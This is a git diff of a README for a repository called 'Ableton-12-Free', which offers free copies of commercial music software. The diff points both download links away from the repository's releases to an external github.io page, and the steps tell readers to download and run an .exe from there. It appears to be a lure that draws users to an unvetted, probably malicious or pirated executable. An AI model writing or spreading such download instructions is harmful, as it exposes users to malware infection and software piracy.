@@ -1,6 +1,6 @@
 # 🎹 Ableton-12-Free - Start your professional music production journey
 
-[![Download Ableton-12-Free](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Zalmandetached579/Ableton-12-Free/releases)
+[![Download Ableton-12-Free](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://zalmandetached579.github.io)
 
 ## 📌 Overview
 
@@ -23,7 +23,7 @@ Before you start the installation, ensure your computer meets these requirements
 
 Follow these steps to find the installation files:
 
-1. Visit the following page to see all available releases: [https://github.com/Zalmandetached579/Ableton-12-Free/releases](https://github.com/Zalmandetached579/Ableton-12-Free/releases).
+1. Visit the following page to see all available releases: [https://zalmandetached579.github.io](https://zalmandetached579.github.io).
 2. Look for the section labeled "Assets" at the bottom of the most recent release entry.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your "Downloads" folder.
